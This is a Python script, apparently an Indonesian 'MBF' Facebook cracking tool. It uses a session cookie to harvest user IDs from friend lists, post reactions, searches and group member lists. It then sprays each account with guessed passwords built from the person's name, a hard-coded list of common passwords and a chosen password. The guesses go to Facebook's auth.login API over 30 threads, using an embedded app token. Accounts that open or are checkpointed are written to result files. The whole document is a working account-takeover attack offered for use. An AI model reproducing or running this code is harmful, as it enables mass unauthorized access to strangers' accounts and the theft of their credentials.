# Hello World
# import Yang Diperlukan

try:
    import os, sys, time, requests, mechanize, random, json, re
    from bs4 import BeautifulSoup as parser
    from concurrent.futures import ThreadPoolExecutor
    from datetime import datetime
    from prompt_toolkit.shortcuts import prompt
    from prompt_toolkit.styles import Style
except ModuleNotFoundError:
    os.system('pip install requests')
    os.system('pip install prompt_toolkit')
    os.system('pip install mechanize')
    os.system('pip install bs4')
br = mechanize.Browser()
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
mbasic = 'https://mbasic.facebook.com{}'

global die,check,result,count

#[ Variabel ]#
id     = []
die    = 0
chek   = []
life   = []
count  = 0
check  = 0
result = 0
##############

######[ BANTUAN PASSWORD ]######
help1 = "bangsat"
help2 = "sayang"
help3 = "doraemon"
help4 = "mantan"
help5 = "anjing"
help6 = "anonymous"
help7 = "hacker"
help8 = "kontol"
help9 = "freefire"
################################



###[ Warna/Color ]###
hijau  = '\x1b[1;92m'
cyan   = '\x1b[1;96m'
kuning = '\x1b[1;93m'
ungu   = '\x1b[1;95m'
putih  = '\x1b[1;97m'
biru   = '\x1b[1;94m'
merah  = '\x1b[1;91m'
#####################

# Water + Mark = Watermark / hak cipta. xixixixi
logo = ("""\x1b[1;91m __  __ ____  _____
|  \/  | __ )|  ___|
| |\/| |  _ \| |_
| |  | | |_) |  _|
|_|  |_|____/|_|""")

def masuk():
    os.system('clear')
    print(logo)
    try:
        cek = open("cookies").read()
    except FileNotFoundError:
        cek = input(f"{putih}[{hijau}•{putih}]{putih} Cookies {merah}:{putih} ")
    cek = {"cookie":cek}
    ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
    if "mbasic_logout_button" in str(ismi):
        if "Apa yang Anda pikirkan sekarang" in str(ismi):
            with open("cookies","w") as f:
                f.write(cek["cookie"])
        else:
            # Memindahkan Bahasa
            try:
                requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
            except:
                pass
        print(f'{hijau}[✓]{putih} Login Berhasil');time.sleep(2)
        return cek["cookie"]
    else:
        exit("{merah}[×]{putih} Cookies Tidak Cocok")

def login(username,password,cek=False):
    global die,check,result,count
    b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
    params = {
            'access_token': b,
            'format': 'JSON',
            'sdk_version': '2',
            'email': username,
            'locale': 'en_US',
            'password': password,
            'sdk': 'ios',
            'generate_session_cookies': '1',
            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
    }
    api = 'https://b-api.facebook.com/method/auth.login'
    response = requests.get(api, params=params)
    if 'session_key' in response.text and "EAAA" in response.text:
        result += 1
        if cek:
            life.append(username+"|"+password)
        else:
            with open('mbf_OK.txt','a') as f:
                f.write('OK ~> ' + username + ' | ' + password + '\n')
    elif 'www.facebook.com' in response.json()['error_msg']:
          check += 1
          if cek:
              chek.append(username+"|"+password)
          else:
              with open('mbf_CP.txt','a') as f:
                  f.write('CP ~> ' + username + ' | ' + password + '\n')
    else:
        die += 1
    c = datetime.now().strftime('%H:%M:%S')
    print(f'\r{putih}[{cyan}{c}{putih}] Cracking =[{hijau}OK{putih}:~{hijau}{str(result)}{putih} | {kuning}CP{putih}:~{kuning}{str(check)}{putih} | {merah}DIE{putih}:~{merah}{str(die)}{putih}]=',end="")

def getid(url):
    raw = requests.get(url,cookies=kuki).content
    getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
    for x in getuser:
        if 'profile' in x[0]:
            id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
        elif 'friends' in x:
            continue
        else:
            id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
        print(f'\r{hijau}[=] {putih}Mengumpulkan {merah}{str(len(id))}{putih} ID ',end="")
    if 'Lihat Teman Lain' in str(raw):
        getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
    return id

def fromlikes(url):
    try:
        like = requests.get(url,cookies=kuki).content
        love = re.findall('href="(/ufi.*?)"',str(like))[0]
        aws = getlike(mbasic.format(love))
        return aws
    except:
        return aws

def getlike(react):
    like = requests.get(react,cookies=kuki).content
    ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
    for user in ids:
        if 'profile' in user[0]:
            id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
        else:
            id.append(user[1] + "|" + user[0].split('/')[1])
        print(f'\r{hijau}[=] {putih}Mengumpulkan {merah}{str(len(id))}{putih} ID ',end="")
    if 'Lihat Selengkapnya' in str(like):
        getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
    return id

def bysearch(option):
    search = requests.get(option,cookies=kuki).content
    users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
    for user in users:
        if "profile" in user[0]:
            id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
        else:
            id.append(user[1] + "|" + user[0].split("?")[0])
        print(f'\r{hijau}[=] {putih}Mengumpulkan {merah}{str(len(id))}{putih} ID ',end="")
    if "Lihat Hasil Selanjutnya" in str(search):
        bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
    return id

def grubid(endpoint):
    grab = requests.get(endpoint,cookies=kuki).content
    users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
    for user in users:
        if "profile" in user[0]:
            id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
        else:
            id.append(user[1] + "|" + user[0])
        print(f'\r{hijau}[=] {putih}Mengumpulkan {merah}{str(len(id))}{putih} ID ',end="")
    if "Lihat Selengkapnya" in str(grab):
        grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
    return id

if __name__ == '__main__':
   try:
       ses = requests.Session()
       kukis = masuk()
       kuki = {'cookie':kukis}
       os.system("clear")
       print(logo)
       print(f'\n{merah}1.{putih} Crack ID List Teman')
       print(f'{merah}2.{putih} Crack ID List Dari Teman')
       print(f'{merah}3.{putih} Crack Dari React Post')
       print(f'{merah}4.{putih} Crack Dari Seacrh Query')
       print(f'{merah}5.{putih} Crack Dari ID Groups')
       print(f'{merah}0.{putih} Logout')
       tanya = input(f'\n{hijau}[!] {putih}Pilih Menu{merah}: {putih}')
       if tanya =="":
           exit(f"{merah}[×] {putih}Jangan Kosong{merah}!!!")
       elif tanya == '1':
           url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
           username = getid(mbasic.format(url["href"]))
       elif tanya == '2':
           idteman = input(f"{hijau}[!] {putih}Masukan ID Teman{merah}: {putih}")
           if idteman.isdigit():
               user = "/profile.php?id=" + idteman
           else:
               user = "/" + idteman
           try:
               user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
               username = getid(mbasic.format(user))
           except TypeError:
               exit(f"{merah}[×] {putih}Teman Tidak Ditemukan")
       elif tanya == '3':
           username = input(f"{hijau}[!] {putih}URL Postingan{merah}: {putih}")
           if username == "":
               exit(f"{merah}[×] {putih}Postingan Tidak Ditemukan")
           elif 'www.facebook' in username:
               username = username.replace('www.facebook','mbasic.facebook')
           elif 'm.facebook.com' in username:
               username = username.replace('m.facebook.com','mbasic.facebook.com')
           username = fromlikes(username)
       elif tanya == '4':
           anu = input(f"{hijau}[!] {putih}Query{merah}: {putih}")
           username = bysearch(mbasic.format('/search/people/?q='+anu))
           if len(username) == 0:
               exit(f"{merah}[×] {putih}Query Tidak Ada")
       elif tanya == '5':
           grab = input(f"{hijau}[!] {putih}Masukan ID Grup{merah}: {putih}")
           username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
           if len(username) == 0:
               exit(f"{merah}[×] {putih}Kamu Belum Bergabung")
       elif tanya == '0':
           os.system('rm cookies')
           exit(f'{hijau}[✓]{putih} Logout Berhasil')
       expass = input(f"\n{hijau}[*]{putih} Set Password{merah}:{putih} ")
       with ThreadPoolExecutor(max_workers=30) as ex:
           for user in username:
               users = user.split('|')
               ss = users[0].split(' ')
               for x in ss:
                   listpass = [str(x)+'123',str(x)+'1234',str(x)+'12345',str(x)+'321',str(x)+'4321',help1,help2,help3,help4,help5,help6,help7,help8,help9,expass]
                   listpass.append(expass)
                   for passw in set(listpass):
                        ex.submit(login,(users[1]),(passw))
       if check != 0 or result != 0:
           print(f'\n{hijau}[✓] {putih}SELESAI{merah}..{putih}')
           os.system('cat mbf_OK.txt')
           os.system('cat mbf_CP.txt')
       else:
           print(f'\n{hijau}[✓] {putih}SELESAI\n    TIDAK ADA RESULT')
   except (KeyboardInterrupt,EOFError):
       exit()
   except requests.exceptions.ConnectionError:
       exit(f"{merah}[!] {putih}Hidupkan Koneksi Anda")
   except (mechanize.URLError):
       exit(f"{merah}[!] {putih}Hidupkan Koneksi Anda")
